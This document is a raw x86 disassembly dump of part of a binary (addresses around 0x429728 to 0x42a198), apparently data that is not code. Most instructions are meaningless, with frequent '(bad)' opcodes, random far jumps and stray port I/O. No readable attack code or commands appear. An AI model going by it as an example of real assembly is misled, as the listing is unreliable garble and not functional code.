  429728:	pop    edi
  429729:	bound  ebx,QWORD PTR [ecx-0x6f]
  42972c:	in     eax,dx
  42972d:	retf   0xf0fa
  429730:	add    DWORD PTR [edi+0x6d53330d],ebp
  429736:	push   edi
  429737:	mov    esp,0xe459e2a1
  42973c:	pop    edx
  42973d:	lods   al,BYTE PTR ds:[esi]
  42973e:	out    dx,al
  42973f:	mov    ecx,0x1b43c613
  429744:	cs dec edi
  429746:	rol    BYTE PTR [eax-0x818f329],1
  42974c:	in     al,0x91
  42974e:	cli    
  42974f:	popa   
  429750:	cdq    
  429751:	pop    eax
  429752:	lods   eax,DWORD PTR ds:[esi]
  429753:	xor    eax,0xc277afd3
  429758:	dec    esi
  429759:	cli    
  42975a:	push   ebp
  42975b:	dec    esi
  42975c:	popf   
  42975d:	push   esp
  42975e:	ja     0x4297a3
  429760:	inc    edi
  429761:	xor    BYTE PTR [ebp-0x47],dh
  429764:	js     0x429714
  429766:	pop    ds
  429767:	hlt    
  429768:	mov    eax,0x5585766c
  42976d:	jmp    0x42975f
  42976f:	jle    0x429767
  429771:	cld    
  429772:	pushf  
  429773:	fwait
  429774:	mov    bl,0x24
  429776:	pop    edi
  429777:	dec    ebp
  429778:	mov    dh,0xa0
  42977a:	push   ds
  42977b:	sub    eax,0xcb66ec10
  429780:	sbb    BYTE PTR [ecx-0x60],0x90
  429784:	xchg   BYTE PTR es:[ebx+0x3026fd24],bh
  42978b:	ret    
  42978c:	fs int3 
  42978e:	jmp    0x42984c
	...
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	popf   
  429801:	pop    es
  429802:	inc    edi
  429803:	xchg   edx,eax
  429804:	je     0x4297c1
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	sub    dl,cl
  42980e:	xor    eax,0x8946107a
  429813:	enter  0x28be,0x63
  429817:	mov    al,bl
  429819:	mov    dh,0x7
  42981b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42981c:	iret   
  42981d:	and    eax,0xb832c947
  429822:	and    DWORD PTR [esi-0x52],esi
  429825:	xor    ebp,DWORD PTR [edx+0x6e82380]
  42982b:	pop    esp
  42982c:	jecxz  0x4297d1
  42982e:	fwait
  42982f:	sub    BYTE PTR [ecx],ch
  429831:	sbb    bl,BYTE PTR [esi-0x355691e9]
  429837:	cmp    eax,0xb22c8184
  42983c:	frstor [ebp-0x7d]
  42983f:	sbb    DWORD PTR [edx-0x4cd21b68],esi
  429845:	ins    DWORD PTR es:[edi],dx
  429846:	call   0xcf0b:0xdd5012d0
  42984d:	adc    al,0xd4
  42984f:	sub    BYTE PTR [eax+0x4b],dl
  429852:	fbstp  TBYTE PTR [edi+0x3]
  429855:	dec    edi
  429856:	pavgw  mm3,QWORD PTR [eax+0x42]
  42985a:	xchg   esi,eax
  42985b:	adc    al,0x4a
  42985d:	repz sbb BYTE PTR [ecx-0x71],ch
  429861:	sahf   
  429862:	cmp    al,0x2e
  429864:	std    
  429865:	ja     0x429836
  429867:	out    dx,eax
  429868:	dec    DWORD PTR [eax-0x39]
  42986b:	rcl    DWORD PTR [ebp-0x78e69047],cl
  429871:	out    0x73,eax
  429873:	adc    esp,DWORD PTR [eax+eiz*2-0x6c4db97b]
  42987a:	sub    eax,0x31dbf6de
  42987f:	jge    0x42983c
  429881:	stos   DWORD PTR es:[edi],eax
  429882:	retf   0x86fc
  429885:	inc    edx
  429886:	xor    BYTE PTR [esi+0x20],0x22
  42988a:	sub    cl,bl
  42988c:	lods   al,BYTE PTR ds:[esi]
  42988d:	paddsb mm2,QWORD PTR [ecx]
  429890:	fmul   QWORD PTR [esi]
  429892:	jp     0x429858
  429894:	in     eax,0x49
  429896:	call   0x1d82:0x34873ac9
  42989d:	xchg   ecx,eax
  42989e:	push   esp
  42989f:	enter  0x585a,0x16
  4298a3:	and    eax,0x518ee100
  4298a8:	(bad)  
  4298a9:	retf   0xf05d
  4298ac:	mov    al,ds:0x8aa55ec8
  4298b1:	adc    cl,bl
  4298b3:	aaa    
  4298b4:	xor    eax,0x1b6af666
  4298b9:	pusha  
  4298ba:	jae    0x42990c
  4298bc:	int3   
  4298bd:	dec    esi
  4298be:	outs   dx,BYTE PTR ds:[esi]
  4298bf:	bound  ebp,QWORD PTR [ebp-0x1e]
  4298c2:	mov    ds:0x48198421,eax
  4298c7:	stos   DWORD PTR es:[edi],eax
  4298c8:	iret   
  4298c9:	mov    cl,0x45
  4298cb:	mov    al,0x9d
  4298cd:	jmp    0x382305c
  4298d2:	xchg   edx,eax
  4298d3:	out    0x7a,al
  4298d5:	les    edi,FWORD PTR ds:0xe792f681
  4298db:	pop    edx
  4298dc:	fs mov bl,0xd0
  4298df:	and    al,0x31
  4298e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298e2:	add    eax,0xe1b601ed
  4298e7:	inc    ecx
  4298e8:	jb     0x42990a
  4298ea:	dec    BYTE PTR [ebp+0x1d4d9467]
  4298f0:	cs cld 
  4298f2:	stc    
  4298f3:	mov    esp,0x6573f65d
  4298f8:	or     DWORD PTR [ebx-0x75],0x7581f86c
  4298ff:	outs   dx,BYTE PTR ds:[esi]
  429900:	out    dx,eax
  429901:	pop    eax
  429902:	cli    
  429903:	loope  0x4298c7
  429905:	stos   DWORD PTR es:[edi],eax
  429906:	retf   
  429907:	pop    ebx
  429908:	fimul  WORD PTR [edi+eiz*2+0x8ccd5c7]
  42990f:	mov    ds:0x0,eax
	...
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	les    ebx,FWORD PTR [eax-0x4387958d]
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
  42998a:	add    BYTE PTR [eax],al
  42998c:	dec    ecx
  42998d:	sti    
  42998e:	femms  
  429990:	xchg   ebp,eax
  429991:	imul   ebx,DWORD PTR [ecx],0x2e
  429994:	rcr    ecx,1
  429996:	sbb    DWORD PTR [ebp-0x778bbecb],0x735bc61e
  4299a0:	mov    cl,0x4
  4299a2:	data16 je 0x42999b
  4299a5:	shr    DWORD PTR [esi-0x44],1
  4299a8:	pop    ebx
  4299a9:	jae    0x42996d
  4299ab:	pop    es
  4299ac:	popa   
  4299ad:	mov    ecx,0x4a8758a5
  4299b2:	push   0xffffffc0
  4299b4:	sbb    DWORD PTR [ebx-0x58204836],esi
  4299ba:	retf   
  4299bb:	or     dh,ah
  4299bd:	fnsave [ecx-0x79]
  4299c0:	push   cs
  4299c1:	cmp    esi,edi
  4299c3:	push   esp
  4299c4:	les    esp,FWORD PTR [ebx]
  4299c6:	les    ebp,FWORD PTR [ecx+0x47]
  4299c9:	push   ebp
  4299ca:	mov    dl,0xaa
  4299cc:	retf   0x4365
  4299cf:	cmp    DWORD PTR [ebx+esi*1-0x5f],edx
  4299d3:	dec    esp
  4299d4:	mov    eax,ds:0x83072375
  4299d9:	jmp    0x42995b
  4299db:	fadd   QWORD PTR [ecx-0x7f]
  4299de:	addr16 mov ds:0x2675,al
  4299e2:	sbb    al,BYTE PTR [esi]
  4299e4:	and    eax,0x171dc83a
  4299e9:	mov    bl,0x4
  4299eb:	dec    eax
  4299ec:	idiv   DWORD PTR [eax]
  4299ee:	imul   esp,DWORD PTR [ebp-0x4fe17d4a],0xe16c3da4
  4299f8:	inc    ebx
  4299f9:	jp     0x429a27
  4299fb:	jecxz  0x429a59
  4299fd:	xchg   esp,eax
  4299fe:	add    edi,0xf3ee86ee
  429a04:	jno    0x4299b4
  429a06:	in     al,dx
  429a07:	mov    ch,0xd6
  429a09:	jne    0x4299b6
  429a0b:	xor    edx,esp
  429a0d:	(bad)  
  429a0e:	into   
  429a0f:	push   eax
  429a10:	or     ebp,DWORD PTR [ebx]
  429a12:	mov    ds:0xbeef7bb8,eax
  429a17:	mov    edx,0x2bff6c62
  429a1c:	mov    eax,0xa5e02632
  429a21:	xlat   BYTE PTR ds:[ebx]
  429a22:	aad    0xa1
  429a24:	out    0x5f,eax
  429a26:	push   cs
  429a27:	das    
  429a28:	push   ebx
  429a29:	mov    ah,0x9e
  429a2b:	mov    ecx,DWORD PTR [eax+0x71]
  429a2e:	mov    edi,0x9a4db5d5
  429a34:	sar    dl,cl
  429a36:	popa   
  429a37:	xor    DWORD PTR [ebp-0x74],ebp
  429a3a:	ficom  WORD PTR [esi-0x3a5dd128]
  429a40:	and    eax,0xbd7d700d
  429a45:	std    
  429a46:	aad    0xbd
  429a48:	hlt    
  429a49:	das    
  429a4a:	mov    al,0x5d
  429a4c:	jmp    eax
  429a4e:	mov    ds:0x7936e742,al
  429a53:	pop    edx
  429a54:	cld    
  429a55:	je     0x4299f4
  429a57:	xlat   BYTE PTR ds:[ebx]
  429a58:	mov    ecx,0x54dae02d
  429a5d:	dec    edi
  429a5e:	jo     0x429ac3
  429a60:	xchg   BYTE PTR [eax],bh
  429a62:	add    BYTE PTR [ebp-0x3d],bl
  429a65:	and    DWORD PTR [ecx-0x5d6b9913],esp
  429a6b:	cmp    dh,BYTE PTR [ecx]
  429a6d:	daa    
  429a6e:	test   DWORD PTR ds:0xb248b1d,ecx
  429a74:	pushf  
  429a75:	(bad)  
  429a76:	retf   0xbddd
  429a79:	mov    edx,0x6188301
  429a7e:	cmp    DWORD PTR [edi+0x6d],ebp
  429a81:	and    BYTE PTR fs:[edx],al
  429a84:	push   ds
  429a85:	jnp    0x429a70
  429a87:	jl     0x429a16
  429a89:	loop   0x429a4a
  429a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a8c:	adc    ch,BYTE PTR [ebx+0xf735]
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x95a95667
  429b01:	jnp    0x429b21
  429b03:	and    bh,BYTE PTR [ebp+edi*4+0x1]
  429b07:	add    BYTE PTR [ecx+eax*1],al
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	or     BYTE PTR [ecx+0x288d49e3],ah
  429b12:	outs   dx,BYTE PTR ds:[esi]
  429b13:	stos   DWORD PTR es:[edi],eax
  429b14:	out    0xdb,al
  429b16:	jmp    0xcd65:0x9f9f49e
  429b1d:	cmp    BYTE PTR [ebp+ebp*4-0x377aba9e],bh
  429b24:	xor    bh,cl
  429b26:	adc    DWORD PTR [eax],ecx
  429b28:	cmc    
  429b29:	add    BYTE PTR [esi+0x1d6a79b5],0xc
  429b30:	inc    esi
  429b31:	xchg   ebp,eax
  429b32:	and    eax,DWORD PTR [ecx-0x72b79813]
  429b38:	push   ss
  429b39:	mov    ds:0xad75c595,eax
  429b3e:	jge    0x429b85
  429b40:	cld    
  429b41:	pop    ds
  429b42:	pop    ebx
  429b44:	test   DWORD PTR [edi-0x7c3ead8],ecx
  429b4a:	jne    0x429b83
  429b4c:	(bad)  
  429b4d:	outs   dx,BYTE PTR ds:[esi]
  429b4e:	mov    esi,0x956b3589
  429b53:	mov    edi,DWORD PTR [edi]
  429b55:	(bad)  
  429b56:	jecxz  0x429af8
  429b58:	xor    edx,DWORD PTR [esi]
  429b5a:	retf   0xa7bf
  429b5d:	jmp    0x429b4f
  429b5f:	sub    esp,ebp
  429b61:	or     DWORD PTR [ecx+0x2206cce8],ecx
  429b67:	fxch   st(3)
  429b69:	sub    esp,DWORD PTR [eax+0x2c]
  429b6c:	gs xchg ecx,eax
  429b6e:	mov    ecx,DWORD PTR [edx-0x31]
  429b71:	mov    ch,0xc4
  429b73:	mov    BYTE PTR [ebp+0x2b],ah
  429b76:	push   ebx
  429b77:	sbb    al,0x7b
  429b79:	cwde   
  429b7a:	cmc    
  429b7b:	or     BYTE PTR [edx+0x2d],0x96
  429b7f:	pop    es
  429b80:	pusha  
  429b81:	into   
  429b82:	lahf   
  429b83:	cwde   
  429b84:	jmp    0xce9b:0xf711315e
  429b8b:	mov    dl,0xa8
  429b8d:	fisub  DWORD PTR gs:[edx-0x59]
  429b91:	pop    es
  429b92:	into   
  429b93:	in     eax,dx
  429b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b95:	stos   DWORD PTR es:[edi],eax
  429b96:	pop    ds
  429b97:	ret    0x3344
  429b9a:	stos   BYTE PTR es:[edi],al
  429b9b:	enter  0x9eb2,0x0
  429b9f:	mov    bl,0xc6
  429ba1:	mov    eax,0xda5da8c9
  429ba6:	xor    eax,ebp
  429ba8:	jne    0x429bd3
  429baa:	out    0xf0,al
  429bac:	adc    eax,eax
  429bae:	dec    esi
  429baf:	int    0x88
  429bb1:	xchg   edi,eax
  429bb2:	push   esi
  429bb3:	cmp    al,0x4e
  429bb5:	cmp    edx,ebp
  429bb7:	sub    edx,edi
  429bb9:	fstp   st(4)
  429bbb:	cld    
  429bbc:	std    
  429bbd:	repnz in eax,dx
  429bbf:	lds    esp,FWORD PTR [eax-0x746a5de1]
  429bc5:	(bad)  
  429bc7:	mov    cl,0x8c
  429bc9:	stos   DWORD PTR es:[edi],eax
  429bca:	cmp    esp,DWORD PTR [edi-0x41dbc0a6]
  429bd0:	call   0x1b70:0xef5f7c84
  429bd7:	and    al,0xb7
  429bd9:	mov    ch,0xbd
  429bdb:	pop    ebx
  429bdc:	(bad)  
  429bdd:	ds (bad) 
  429bdf:	adc    eax,0xb37e1de2
  429be4:	pop    ds
  429be5:	ins    BYTE PTR es:[edi],dx
  429be6:	xor    esi,DWORD PTR [ebp-0x75]
  429be9:	retf   0xa74d
  429bec:	jo     0x429bdb
  429bee:	test   eax,0x91b175bd
  429bf3:	mov    cl,0x23
  429bf5:	mov    al,ds:0xe84be4e2
  429bfa:	es jg  0x429b94
  429bfd:	pop    esi
  429bfe:	je     0x429c6c
  429c00:	in     al,dx
  429c01:	cli    
  429c02:	mov    al,0x59
  429c04:	push   es
  429c05:	enter  0x88bf,0x8d
  429c09:	mov    BYTE PTR [ebx],ah
  429c0b:	jno    0x429c1c
  429c0d:	and    BYTE PTR [ebx],ch
  429c0f:	xchg   edx,eax
	...
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    ch,bl
  429c81:	(bad)  
  429c82:	xchg   edi,eax
  429c83:	jo     0x429c05
  429c85:	mov    esi,0x1040001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	adc    al,0x35
  429c8e:	xor    eax,ebp
  429c90:	or     bh,BYTE PTR [ebx+0x3a]
  429c93:	xchg   esp,eax
  429c94:	push   0xffffff9f
  429c96:	aaa    
  429c97:	mov    edi,0xdc4bfa66
  429c9c:	lahf   
  429c9d:	add    DWORD PTR [edx],ebp
  429c9f:	das    
  429ca0:	div    BYTE PTR [edi-0x466fd861]
  429ca6:	mov    bl,0x9c
  429ca8:	pop    edx
  429ca9:	mov    ah,0x5d
  429cab:	add    esp,DWORD PTR [edi+0x4a]
  429cae:	jmp    0x429cc9
  429cb0:	test   BYTE PTR [edi+0x4c],cl
  429cb3:	pop    ebx
  429cb4:	(bad)  [ecx-0x2c]
  429cb7:	mov    esi,DWORD PTR [eax*1+0x7f61552]
  429cbe:	neg    DWORD PTR [edx-0x19]
  429cc1:	pop    esi
  429cc2:	out    0xab,al
  429cc4:	mov    dh,0x3f
  429cc6:	cs mov ebx,0xfd212242
  429ccc:	xor    DWORD PTR [edx-0x54],0xb79e0430
  429cd3:	jns    0x429cdf
  429cd5:	js     0x429cc8
  429cd7:	sar    DWORD PTR [esi+eiz*8],0x69
  429cdb:	stos   DWORD PTR es:[edi],eax
  429cdc:	xor    ebx,esi
  429cde:	call   0x56e19404
  429ce3:	inc    esi
  429ce4:	xchg   DWORD PTR [ecx+0x24],esi
  429ce7:	mul    DWORD PTR [edx-0x5d]
  429cea:	inc    ebp
  429ceb:	das    
  429cec:	fnstcw WORD PTR [edx]
  429cee:	inc    edi
  429cef:	pop    DWORD PTR [ebp+0x2f]
  429cf2:	out    0x87,al
  429cf4:	jmp    0xfa48b7cb
  429cf9:	sbb    DWORD PTR [eax-0x69eae8e7],ecx
  429cff:	out    dx,al
  429d00:	and    BYTE PTR [eax+ebp*4],0xab
  429d04:	dec    edx
  429d05:	scas   eax,DWORD PTR es:[edi]
  429d06:	loopne 0x429d4e
  429d08:	or     DWORD PTR [edx+esi*8],edx
  429d0b:	repz shr BYTE PTR [esi],cl
  429d0e:	loope  0x429d5a
  429d10:	xchg   esi,eax
  429d11:	inc    eax
  429d12:	mov    esi,0xb1faa21c
  429d17:	fs aaa 
  429d19:	adc    eax,0x7ca31fc
  429d1e:	lock repnz inc esi
  429d21:	lods   eax,DWORD PTR ds:[esi]
  429d22:	cmp    ecx,DWORD PTR [esi]
  429d24:	push   edi
  429d25:	sub    al,0xe9
  429d27:	or     BYTE PTR ss:[esi+esi*1],dl
  429d2b:	xchg   ecx,eax
  429d2c:	repnz aas 
  429d2e:	bound  ebx,QWORD PTR [edi-0x4bb5c7a3]
  429d34:	ror    DWORD PTR [ebp-0x48afe4aa],cl
  429d3a:	dec    eax
  429d3b:	inc    ecx
  429d3c:	cmp    BYTE PTR [esi+0x46],0x29
  429d40:	mov    dl,ah
  429d42:	ficomp WORD PTR [esi-0x74]
  429d45:	push   esp
  429d46:	jle    0x429db2
  429d48:	pushf  
  429d49:	jmp    0x429d25
  429d4b:	pop    ss
  429d4c:	jmp    DWORD PTR [ebp+0x4b435c4]
  429d52:	jmp    0x37c8:0xdb6dbce6
  429d59:	mov    WORD PTR [ecx-0x652a3363],ds
  429d5f:	mov    dl,BYTE PTR [ecx+0x4a]
  429d62:	sbb    BYTE PTR [edi+0x7b1124d6],bl
  429d68:	in     eax,dx
  429d69:	add    DWORD PTR [ebp+0x1b],ecx
  429d6c:	neg    BYTE PTR [edi-0xed448da]
  429d72:	cmp    al,0x50
  429d74:	or     dh,ch
  429d76:	xor    ch,cl
  429d78:	retf   0xa855
  429d7b:	(bad)  
  429d7c:	mov    cl,0x83
  429d7e:	xor    BYTE PTR [edi+0x2d3c9ad2],bh
  429d84:	pop    esp
  429d85:	jecxz  0x429d3e
  429d87:	adc    BYTE PTR ds:0xa95e0bc0,bl
  429d8d:	pop    eax
  429d8e:	xchg   ecx,eax
  429d8f:	add    BYTE PTR [eax],0x0
	...
  429df2:	add    BYTE PTR [eax],al
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	leave  
  429e01:	sub    esi,ebx
  429e03:	aas    
  429e04:	test   BYTE PTR [edi+0x1040001],bh
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	pop    ss
  429e0d:	hlt    
  429e0e:	dec    ebx
  429e0f:	sbb    eax,0x13b4590
  429e14:	xchg   edi,eax
  429e15:	bnd jp 0x429e10
  429e18:	jno    0x429e75
  429e1a:	push   esp
  429e1b:	(bad)  
  429e1d:	jge    0x429e2e
  429e1f:	pop    ds
  429e20:	pop    ebp
  429e21:	loop   0x429e77
  429e23:	mov    ds:0x769f85c0,eax
  429e28:	ret    
  429e29:	mov    edx,DWORD PTR [ebx]
  429e2b:	sub    DWORD PTR [esi],edi
  429e2d:	or     BYTE PTR [ebp-0x31],dh
  429e30:	shr    BYTE PTR [ebx-0x3],1
  429e33:	or     bl,BYTE PTR [esi]
  429e35:	aam    0x6b
  429e37:	mov    bl,0x5f
  429e39:	adc    BYTE PTR [eax+0x5b],bl
  429e3c:	cmp    eax,0xdaef8ee9
  429e41:	test   DWORD PTR [eax],esp
  429e43:	cdq    
  429e44:	push   ss
  429e45:	xchg   edi,eax
  429e46:	push   ebp
  429e47:	jmp    0x458b884f
  429e4c:	jle    0x429e71
  429e4e:	sbb    edx,DWORD PTR fs:[esi+0x7e16c431]
  429e55:	dec    ecx
  429e56:	dec    esi
  429e57:	in     eax,dx
  429e58:	aam    0x37
  429e5a:	ins    BYTE PTR es:[edi],dx
  429e5b:	daa    
  429e5c:	jbe    0x429dfd
  429e5e:	fsub   DWORD PTR ds:0x5e79753c
  429e64:	dec    ecx
  429e65:	xor    dh,ah
  429e67:	xchg   edx,eax
  429e68:	das    
  429e69:	or     DWORD PTR ds:0x257edf69,eax
  429e6f:	mov    dh,0x9b
  429e71:	and    al,0x87
  429e73:	pop    ecx
  429e74:	sbb    esp,DWORD PTR [edx+ebx*8-0x783ef689]
  429e7b:	mov    al,0x9a
  429e7d:	ins    DWORD PTR es:[edi],dx
  429e7e:	mov    al,0x9f
  429e80:	mov    ds:0x1f3af459,al
  429e85:	lds    esi,FWORD PTR [eax-0x18bd0ea7]
  429e8b:	imul   ecx,DWORD PTR ss:[edx-0x1],0xffffffa2
  429e90:	ficomp DWORD PTR [eax-0x1a]
  429e93:	test   eax,0x9e6c0689
  429e98:	cmp    edx,0x4773b81b
  429e9e:	(bad)
  429ea1:	idiv   DWORD PTR [edi-0x4b]
  429ea4:	adc    DWORD PTR [eax-0x5f712a1e],ebp
  429eaa:	xor    eax,0xb7e6c67b
  429eaf:	test   ah,0x5f
  429eb2:	jmp    0xba11:0xecf37d9
  429eb9:	mov    cl,0x9d
  429ebb:	test   ecx,ebx
  429ebd:	cmp    edi,esp
  429ebf:	int3   
  429ec0:	pop    ebx
  429ec1:	loop   0x429e9a
  429ec3:	jns    0x429f2f
  429ec5:	aaa    
  429ec6:	into   
  429ec7:	retf   0x2485
  429eca:	std    
  429ecb:	das    
  429ecc:	pop    es
  429ecd:	mov    cl,0xa6
  429ecf:	or     dl,bh
  429ed1:	adc    al,0xe5
  429ed3:	add    BYTE PTR [edx+0x71],al
  429ed6:	cld    
  429ed7:	pop    ss
  429ed8:	test   bh,dl
  429eda:	shr    BYTE PTR [eax+ebp*2+0x67],1
  429ede:	sahf   
  429edf:	jae    0x429f55
  429ee1:	jbe    0x429f1c
  429ee3:	xor    BYTE PTR ss:[edi+0x37],ah
  429ee7:	adc    al,0x4
  429ee9:	stos   BYTE PTR es:[edi],al
  429eea:	and    esp,0x27
  429eed:	stc    
  429eee:	out    0x1b,al
  429ef0:	outs   dx,BYTE PTR ds:[esi]
  429ef1:	pop    esp
  429ef2:	xor    al,0x40
  429ef4:	(bad)
  429ef7:	pop    edi
  429ef8:	fcom   QWORD PTR [esi]
  429efa:	iret   
  429efb:	data16 xor al,0x4a
  429efe:	jbe    0x429eb9
  429f00:	in     eax,0x53
  429f02:	push   0xa8ef131
  429f07:	iret   
  429f08:	dec    ebx
  429f09:	sbb    ecx,ebx
  429f0b:	mov    edi,DWORD PTR [ebx-0x3]
  429f0e:	mov    bl,0x93
	...
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x42a33b1f]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	stos   DWORD PTR es:[edi],eax
  429f8d:	inc    ebp
  429f8e:	and    al,0xd0
  429f90:	jl     0x42a006
  429f92:	in     al,dx
  429f93:	sbb    ebp,DWORD PTR [edi]
  429f95:	dec    ebp
  429f96:	cdq    
  429f97:	and    eax,0xbb7d593c
  429f9c:	push   eax
  429f9d:	outs   dx,DWORD PTR ds:[esi]
  429f9e:	leave  
  429f9f:	ds ret 
  429fa1:	sub    eax,0xc7ef6e5f
  429fa6:	bound  esi,QWORD PTR [ebp-0x1f1cdc77]
  429fac:	mov    edi,0xc3c37081
  429fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fb2:	mov    ds:0xb09a9f98,al
  429fb7:	fild   DWORD PTR [esi+0x2134ba75]
  429fbd:	inc    esi
  429fbe:	jge    0x429f74
  429fc0:	push   ecx
  429fc1:	or     BYTE PTR [ecx-0x2e],dh
  429fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429fc5:	sahf   
  429fc6:	mov    cl,0x49
  429fc8:	fwait
  429fc9:	cmp    bh,BYTE PTR [ebp+edi*8+0x3c]
  429fcd:	or     dl,BYTE PTR [esp+edi*4-0x4a]
  429fd1:	pop    ss
  429fd2:	test   bl,ch
  429fd4:	or     eax,0x4d51e18c
  429fd9:	inc    edx
  429fda:	out    0xfb,al
  429fdc:	or     al,0x50
  429fde:	and    esp,DWORD PTR [esi+ecx*1-0x15e89cf6]
  429fe5:	jb     0x429f73
  429fe7:	push   cs
  429fe8:	jns    0x42a05a
  429fea:	push   esi
  429feb:	pusha  
  429fec:	pop    ds
  429fed:	out    0x29,eax
  429fef:	fstp   TBYTE PTR [ebx+0x3cfa3c63]
  429ff5:	shl    DWORD PTR [edi+0x5be3addb],cl
  429ffb:	popf   
  429ffc:	ficom  DWORD PTR [ebx-0x1e992937]
  42a002:	je     0x42a018
  42a004:	shl    BYTE PTR [ebp+0x62a3f2b0],0x1
  42a00b:	sbb    eax,0xa5962dc5
  42a010:	xor    eax,0xd5c52291
  42a015:	adc    edx,DWORD PTR [ebp-0x66]
  42a018:	je     0x42a03a
  42a01a:	mov    WORD PTR [ebp+0x3ca541e8],ds
  42a020:	shl    DWORD PTR [ebx-0x77],0x25
  42a024:	jbe    0x429fff
  42a026:	jb     0x42a01d
  42a028:	punpcklbw mm2,DWORD PTR [ebx+eiz*2-0x40]
  42a02d:	out    0xbe,eax
  42a02f:	popa   
  42a030:	aam    0xda
  42a032:	mov    bh,0x80
  42a034:	dec    ebx
  42a035:	mov    ch,ah
  42a037:	jb     0x42a094
  42a039:	cli    
  42a03a:	(bad)  
  42a03b:	in     al,dx
  42a03c:	(bad)  
  42a03d:	int3   
  42a03e:	jl     0x429fe7
  42a040:	cli    
  42a041:	clc    
  42a042:	call   0x849aefbe
  42a047:	jmp    0x6c66df22
  42a04c:	mov    eax,ds:0x1e26d066
  42a051:	hlt    
  42a052:	fld    QWORD PTR [ecx]
  42a054:	jo     0x42a063
  42a056:	in     al,0xfc
  42a058:	mov    esp,0xd55a1293
  42a05d:	push   ecx
  42a05e:	ret    0x3b6d
  42a061:	add    al,BYTE PTR [esi-0x6]
  42a064:	inc    esp
  42a065:	or     BYTE PTR [ebx+0xd],bl
  42a068:	mov    ch,0xe9
  42a06a:	cmp    eax,DWORD PTR ds:0x36015bcc
  42a070:	sub    eax,0x2ce2931f
  42a075:	out    0x29,al
  42a077:	adc    eax,0xd2ecd72c
  42a07c:	mov    cl,0x3
  42a07e:	and    esi,edi
  42a080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a081:	cli    
  42a082:	popa   
  42a083:	push   ebp
  42a084:	sahf   
  42a085:	rcr    BYTE PTR fs:[ecx-0x4437f67],1
  42a08c:	or     esp,DWORD PTR [ebx+ecx*1]
  42a08f:	inc    eax
	...
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	hlt    
  42a101:	push   ss
  42a102:	or     ch,BYTE PTR [ebx]
  42a104:	mov    ecx,es
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a10d:	imul   ebx,DWORD PTR [ecx-0x6d9a2289],0x1e
  42a114:	xchg   ebp,eax
  42a115:	jmp    0x42a0b6
  42a117:	xor    ch,BYTE PTR [edi+0x54]
  42a11a:	imul   eax,eax,0xce5a9784
  42a120:	dec    esp
  42a121:	out    0xa4,eax
  42a123:	imul   esp,DWORD PTR [ebp-0x4d],0x2a78962b
  42a12a:	div    BYTE PTR [eax]
  42a12c:	mov    dl,0x62
  42a12e:	sub    DWORD PTR [ecx],ebx
  42a130:	add    esi,edi
  42a132:	xchg   esp,eax
  42a133:	jnp    0x42a177
  42a135:	aas    
  42a136:	xchg   esp,eax
  42a137:	(bad)  
  42a138:	push   0xffffffe1
  42a13a:	test   BYTE PTR [ebx],0xa5
  42a13d:	push   0xffffffce
  42a13f:	fdivr  DWORD PTR [ecx+0x6222170d]
  42a145:	jo     0x42a16d
  42a147:	jb     0x42a0db
  42a149:	sub    DWORD PTR [ebx],eax
  42a14b:	fcomip st,st(4)
  42a14d:	aad    0x98
  42a14f:	push   0xbf97633f
  42a154:	loop   0x42a0d8
  42a156:	mov    eax,ebp
  42a158:	or     DWORD PTR [edx+0x18],esp
  42a15b:	aas    
  42a15c:	fcomp  DWORD PTR [eax+0x1f7c66cc]
  42a162:	mov    edx,0xb918963d
  42a167:	jmp    0x42a0f8
  42a169:	inc    ecx
  42a16a:	inc    eax
  42a16b:	sbb    ecx,DWORD PTR [ebx+0x60]
  42a16e:	push   ebx
  42a16f:	xadd   DWORD PTR gs:[edx-0x7ee50dda],eax
  42a177:	inc    DWORD PTR [esi-0x1a]
  42a17a:	inc    edi
  42a17b:	pop    edx
  42a17c:	add    DWORD PTR [ecx],0xadc0f355
  42a182:	xchg   BYTE PTR ds:0x72e30ef2,bl
  42a188:	cmovne edi,DWORD PTR [esi-0x160571f2]
  42a18f:	pop    ecx
  42a190:	inc    edx
  42a191:	popf   
  42a192:	(bad)  {z}
  42a197:	lods   eax,DWORD PTR ds:[esi]
  42a198:	xchg   esi,eax
